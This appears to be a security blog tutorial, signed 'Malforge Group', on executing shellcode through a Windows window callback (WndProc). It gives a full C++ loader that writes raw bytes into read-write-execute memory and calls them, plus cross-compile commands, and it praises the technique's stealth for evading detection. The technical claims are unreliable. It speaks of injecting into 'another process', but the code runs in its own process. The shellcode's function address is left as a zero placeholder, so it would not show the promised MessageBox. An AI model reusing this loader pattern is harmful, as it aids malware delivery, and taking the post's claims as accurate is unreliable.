# Shellcode Injection via Window Callbacks
---

## Introduction

Shellcode injection is a powerful tactic in exploit development and security research, allowing arbitrary code to run within another process. One lesser-known but effective method leverages **window callbacks** in the Windows GUI messaging system to execute shellcode via a custom window procedure (WndProc).

This post provides a detailed overview of this approach, including theory, a fresh proof-of-concept (POC) in C++ (different from previous samples), implementation details, and a security discussion. Whether you're a beginner or expert, this walkthrough aims to bridge theory and practice.

## Table of Contents

- [Introduction](#introduction)
- [Understanding Window Callbacks](#understanding-window-callbacks)
- [Shellcode Injection via Window Callbacks](#shellcode-injection-via-window-callbacks)
- [Proof-of-Concept (POC) Code](#proof-of-concept-poc-code)
- [Compiling on Kali Linux for Windows](#compiling-on-kali-linux-for-windows)
- [How It Works](#how-it-works)
- [Security Considerations](#security-considerations)
- [Conclusion](#conclusion)

## Understanding Window Callbacks

### What is a Callback?

A callback is a function the system calls in response to an event. In Windows applications, callbacks form the backbone of event-driven programming, especially in handling user input and system messages.

### Window Procedure (WndProc)

A **window procedure** is a callback that processes messages (like keystrokes or mouse clicks) for a specific window. Its typical signature:

```cpp
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
```

- `hwnd`: Handle to the window.
- `msg`: The message identifier.
- `wParam`, `lParam`: Message-specific data.

Windows uses a message queue to store messages per thread, which a **message loop** retrieves and dispatches to the corresponding WndProc.

This predictable mechanism makes WndProc a prime candidate for triggering injected shellcode.

## Shellcode Injection via Window Callbacks

### Concept

This method involves:

1. Registering a window class and creating a window with a custom WndProc.
2. Allocating executable memory using `VirtualAlloc`.
3. Writing shellcode into that memory.
4. Triggering WndProc with a custom message to execute the shellcode.
5. Cleaning up memory afterward.

Why this method?

- **Reliable**: WndProc is guaranteed to be called by Windows for messages.
- **Controlled**: You control message dispatch timing.
- **Low suspicion**: Uses standard GUI event flows.
- **Simple**: No need for remote thread injection or IAT hooking.

## Proof-of-Concept (POC) Code

Here's a new C++ POC demonstrating shellcode injection via a window callback. This displays a MessageBox and cleans up after execution.

```cpp
#include <windows.h>

// Minimal 64-bit shellcode to show MessageBox
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
    0x48, 0x31, 0xC9,       // xor rcx, rcx
    0x48, 0x8D, 0x15, 0x1E, 0x00, 0x00, 0x00, // lea rdx, [rel msg]
    0x4C, 0x8D, 0x05, 0x1F, 0x00, 0x00, 0x00, // lea r8, [rel title]
    0x48, 0x31, 0xC9,       // xor rcx, rcx
    0x48, 0xB8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // mov rax, MessageBoxA address placeholder
    0xFF, 0xD0,             // call rax
    0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
    0xC3,                   // ret
    0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x00, // "Hello World\0"
    0x54, 0x65, 0x73, 0x74, 0x00 // "Test\0"
};

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static LPVOID shellcodeAddr = NULL;
    if (msg == WM_USER + 100) {
        shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!shellcodeAddr) {
            MessageBoxW(hwnd, L"Memory allocation failed", L"Error", MB_OK | MB_ICONERROR);
            return 0;
        }
        memcpy(shellcodeAddr, shellcode, sizeof(shellcode));
        ((void(*)())shellcodeAddr)();
        VirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        shellcodeAddr = NULL;
        return 0;
    }
    if (msg == WM_DESTROY) {
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"InjectWindow";

    if (!RegisterClassW(&wc)) {
        MessageBoxW(NULL, L"Window class registration failed", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    HWND hwnd = CreateWindowExW(0, L"InjectWindow", L"Shellcode Demo",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL);

    if (!hwnd) {
        MessageBoxW(NULL, L"Window creation failed", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    SendMessageW(hwnd, WM_USER + 100, 0, 0);

    MSG msg = {0};
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}
```

## Compiling on Kali Linux for Windows

Use **MinGW-w64** for cross-compilation:

```bash
sudo apt update && sudo apt install mingw-w64
x86_64-w64-mingw32-g++ -static -static-libgcc -static-libstdc++ -DUNICODE -D_UNICODE -mwindows shellcode_injection.cpp -o shellcode_injection.exe
```

Key flags:

- `-static`: Avoids dynamic dependencies.
- `-mwindows`: Links GUI subsystem.
- `-DUNICODE`: Enables Unicode APIs.

Then transfer `shellcode_injection.exe` to a Windows machine for testing.

## How It Works

1. **Registers a window class** and creates a window.
2. Shows the window.
3. Sends custom message `WM_USER + 100` to trigger WndProc.
4. WndProc allocates executable memory and copies shellcode.
5. Shellcode runs (displays MessageBox).
6. Memory is freed.
7. The window remains open until closed.

## Security Considerations

- **Stealth**: Works via normal Windows messaging.
- **Controlled**: Execution can be triggered predictably.
- **Abuse potential**: Can be used for malware delivery.
- Always test responsibly in isolated environments.

## Conclusion

Shellcode injection using window callbacks is a fascinating and practical method for executing arbitrary code in a Windows process. This POC demonstrates a clean, stable implementation leveraging the Windows GUI messaging system for execution flow control. A valuable technique for both defenders and red teamers exploring Windows internals.

Thanks for reading!
— **Malforge Group**
